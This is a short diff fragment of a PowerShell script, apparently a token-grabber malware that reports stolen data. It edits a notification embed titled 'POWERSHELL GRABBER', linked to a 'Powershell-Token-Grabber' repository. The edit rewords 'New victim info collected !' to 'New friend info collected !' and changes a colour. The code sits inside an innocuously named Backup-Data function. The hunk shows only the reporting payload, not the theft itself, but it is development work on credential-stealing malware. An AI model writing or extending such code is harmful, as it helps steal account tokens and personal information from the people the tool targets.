@@ -669,8 +669,8 @@ function Backup-Data {
             @{
                 "title" = "POWERSHELL GRABBER"
                 "url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
-                "description" = "New victim info collected !"
-                "color" = "E6870CD"
+                "description" = "New friend info collected !"
+                "color" = "3447003"
                 "footer" = @{
                     "text" = "Have fun! :p"
                 }
